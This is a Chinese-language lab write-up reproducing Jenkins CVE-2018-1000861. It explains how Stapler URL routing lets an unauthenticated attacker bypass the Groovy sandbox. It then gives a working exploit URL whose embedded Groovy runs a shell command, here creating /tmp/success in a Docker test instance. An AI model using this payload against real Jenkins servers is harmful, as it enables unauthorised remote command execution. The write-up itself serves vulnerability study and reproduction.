# Jenkins远程命令执行漏洞 Jenkins远程命令执行漏洞（CVE-2018-1000861）

**漏洞介绍：**

Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。

 

通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。

 

**漏洞复现：**

先启动环境，启动环境后访问http://your-ip:8080即可看到一个已经成功初始化的Jenkins，无需再进行任何操作。

![](../Images/7c00bac9388aab849ccd04c38a7a4305.png)  

  

使用以下的payload，创建在tmp目录下文件：

（浏览器或bp中使用都行）

http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript

?sandbox=true

&value=public class x {

  public x(){

    "touch/tmp/success".execute()

  }

}

 

进去docker里面看看

docker-composeexec jenkins bash

发现成功利用，/tmp/success已成功创建：

![](../Images/3f907c3760715a69da15ee5c3d4516c2.png)

  

利用成功
